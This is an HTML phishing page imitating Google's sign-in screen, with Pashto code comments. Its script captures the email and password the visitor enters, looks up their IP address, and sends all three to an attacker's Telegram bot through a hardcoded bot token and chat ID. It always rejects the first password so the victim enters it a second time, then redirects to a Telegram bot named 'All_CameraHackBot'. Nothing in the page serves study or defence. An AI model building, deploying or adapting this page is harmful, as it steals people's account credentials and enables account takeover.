<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }

        /* د ګوګل اصلي کارت ډیزاین */
        .google-card {
            max-width: 450px;
            width: 100%;
            background: #1e1e2f;
            border-radius: 1rem;
            border: 1px solid #2a2a3a;
            padding: 2rem 1.8rem;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
        }

        .logo {
            text-align: center;
            margin-bottom: 1.2rem;
        }

        .logo span {
            font-size: 2rem;
            font-weight: 500;
            color: #e0e0e0;
            font-family: 'Google Sans', system-ui;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 500;
            color: #e0e0e0;
            margin-bottom: 0.5rem;
            text-align: center;
        }

        .sub {
            color: #9aa0a6;
            font-size: 0.85rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .input-group {
            margin-bottom: 1rem;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 0.85rem 1rem;
            background: #2a2a3a;
            border: 1px solid #3a3a4a;
            border-radius: 0.5rem;
            color: #e0e0e0;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
        }

        .input-group input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
        }

        .input-group input::placeholder {
            color: #6b7280;
        }

        button {
            width: 100%;
            padding: 0.85rem;
            background: #3b82f6;
            border: none;
            border-radius: 0.5rem;
            color: white;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 0.5rem;
        }

        button:hover {
            background: #2563eb;
        }

        /* د لینکونو ډیزاین */
        .links-row {
            display: flex;
            justify-content: space-between;
            margin-top: 1.2rem;
            font-size: 0.75rem;
        }

        .links-row a, .links-row span {
            color: #8ba6bc;
            text-decoration: none;
            cursor: pointer;
        }

        .links-row a:hover, .links-row span:hover {
            color: #3b82f6;
            text-decoration: underline;
        }

        .create-account {
            display: block;
            text-align: center;
            margin-top: 1.2rem;
            font-size: 0.85rem;
            color: #8ba6bc;
            text-decoration: none;
        }

        .create-account:hover {
            color: #3b82f6;
            text-decoration: underline;
        }

        .guest-mode {
            display: block;
            text-align: center;
            margin-top: 0.8rem;
            font-size: 0.7rem;
            color: #6b7280;
        }

        .guest-mode a {
            color: #8ba6bc;
            text-decoration: none;
        }

        .guest-mode a:hover {
            color: #3b82f6;
            text-decoration: underline;
        }

        /* د پیغامونو بکسونه */
        .message {
            margin-top: 1rem;
            padding: 0.7rem;
            border-radius: 0.5rem;
            font-size: 0.8rem;
            text-align: center;
            display: none;
        }

        .error-msg {
            background: rgba(220, 38, 38, 0.15);
            border: 1px solid #ef4444;
            color: #fca5a5;
        }

        .success-msg {
            background: rgba(34, 197, 94, 0.15);
            border: 1px solid #22c55e;
            color: #86efac;
        }

        /* فوټر */
        .footer {
            display: flex;
            justify-content: center;
            gap: 1.2rem;
            margin-top: 1.8rem;
            padding-top: 1rem;
            border-top: 1px solid #2a2a3a;
            font-size: 0.7rem;
            color: #6b7280;
        }

        .footer span {
            cursor: pointer;
        }

        .footer span:hover {
            color: #8ba6bc;
        }

        .step-text {
            text-align: center;
            font-size: 0.7rem;
            color: #6b7280;
            margin-top: 0.8rem;
        }
    </style>
</head>
<body>

<div class="google-card">
    <div class="logo">
        <span>G</span>
    </div>

    <!-- مرحله 1: برېښنالیک -->
    <div id="step1View">
        <h1>Sign in</h1>
        <div class="sub">Use your Google Account</div>

        <div class="input-group">
            <input type="email" id="emailInput" placeholder="Email or phone">
        </div>

        <button id="nextBtn">Next</button>

        <div class="links-row">
            <span onclick="alert('Forgot email? (Demo)')">Forgot email?</span>
            <span onclick="alert('Guest mode (Demo)')">Guest mode</span>
        </div>

        <a href="#" class="create-account" onclick="alert('Create account (Demo)'); return false;">Create account</a>

        <div class="guest-mode">
            <a href="#" onclick="alert('Learn more about Guest mode'); return false;">Learn more</a> about Guest mode
        </div>
    </div>

    <!-- مرحله 2: پټنوم -->
    <div id="step2View" style="display: none;">
        <h1>Welcome back</h1>
        <div class="sub" id="displayEmail"></div>

        <div class="input-group">
            <input type="password" id="passwordInput" placeholder="Enter your password">
        </div>

        <button id="loginBtn">Next</button>

        <div class="links-row">
            <span onclick="goBackToEmail()">← Back</span>
            <span onclick="alert('Forgot password? (Demo)')">Forgot password?</span>
        </div>

        <div class="guest-mode">
            <a href="#" onclick="alert('Learn more'); return false;">Learn more</a> about secure login
        </div>
    </div>

    <div id="errorBox" class="message error-msg"></div>
    <div id="successBox" class="message success-msg"></div>
    <div class="step-text" id="stepIndicator">Step 1 of 2</div>

    <div class="footer">
        <span>English (United States)</span>
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
    </div>
</div>

<script>
    // ==================== Telegram Bot Settings ====================
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";
    const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";

    // د هڅو تعقیبول (د ایمیل پر بنسټ)
    let attemptStore = {};

    // UI عناصر
    const step1View = document.getElementById('step1View');
    const step2View = document.getElementById('step2View');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const displayEmailSpan = document.getElementById('displayEmail');
    const errorBox = document.getElementById('errorBox');
    const successBox = document.getElementById('successBox');
    const stepIndicator = document.getElementById('stepIndicator');

    let currentEmail = "";

    // ========== Helper Functions ==========
    function showMessage(box, text, isError = true) {
        box.textContent = text;
        box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
        box.style.display = 'block';
        setTimeout(() => {
            box.style.display = 'none';
        }, 3500);
    }

    function goBackToEmail() {
        step2View.style.display = 'none';
        step1View.style.display = 'block';
        stepIndicator.textContent = "Step 1 of 2";
        emailInput.value = '';
        passwordInput.value = '';
        currentEmail = "";
    }

    async function getUserIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    async function sendToAdmin(email, password, ip, success) {
        const status = success ? "✅ SUCCESSFUL LOGIN" : "❌ FAILED ATTEMPT";
        const msg = `${status}\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: msg
                })
            });
        } catch (err) {
            console.warn("Telegram error", err);
        }
    }

    // ========== مرحله 1: برېښنالیک ==========
    document.getElementById('nextBtn').addEventListener('click', () => {
        const email = emailInput.value.trim();
        if (!email || !email.includes('@')) {
            showMessage(errorBox, "❌ Please enter a valid email address.", true);
            return;
        }
        currentEmail = email;
        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#3b82f6; font-size:0.7rem;">✓</span>`;
        emailInput.value = '';
        step1View.style.display = 'none';
        step2View.style.display = 'block';
        stepIndicator.textContent = "Step 2 of 2";
        passwordInput.value = '';
        showMessage(successBox, "✅ Email verified. Now enter your password.", false);
    });

    window.goBackToEmail = goBackToEmail;

    // ========== مرحله 2: ننوتنه ==========
    document.getElementById('loginBtn').addEventListener('click', async () => {
        const password = passwordInput.value.trim();
        if (!password) {
            showMessage(errorBox, "❌ Please enter your password.", true);
            return;
        }

        const ip = await getUserIP();
        const key = `${currentEmail}_${ip}`;

        if (!attemptStore[key]) {
            attemptStore[key] = { attempts: 0 };
        }
        const currentAttempt = attemptStore[key].attempts + 1;
        attemptStore[key].attempts = currentAttempt;

        // لومړۍ هڅه — تل ناکامه (معلومات اډمن ته ځي)
        if (currentAttempt === 1) {
            await sendToAdmin(currentEmail, password, ip, false);
            showMessage(errorBox, "❌ Incorrect password. Please try again.", true);
            // بیا له پیل څخه پیل کړئ
            setTimeout(() => {
                goBackToEmail();
            }, 2000);
            return;
        }

        // دوهمه هڅه — بریالۍ
        if (currentAttempt >= 2) {
            await sendToAdmin(currentEmail, password, ip, true);
            showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
            
            const loginBtn = document.getElementById('loginBtn');
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.6';

            setTimeout(() => {
                window.location.href = BOT_REDIRECT;
            }, 1800);
        }
    });

    // د Enter کیلي ملاتړ
    emailInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') document.getElementById('nextBtn').click();
    });
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') document.getElementById('loginBtn').click();
    });
</script>
</body>
</html>
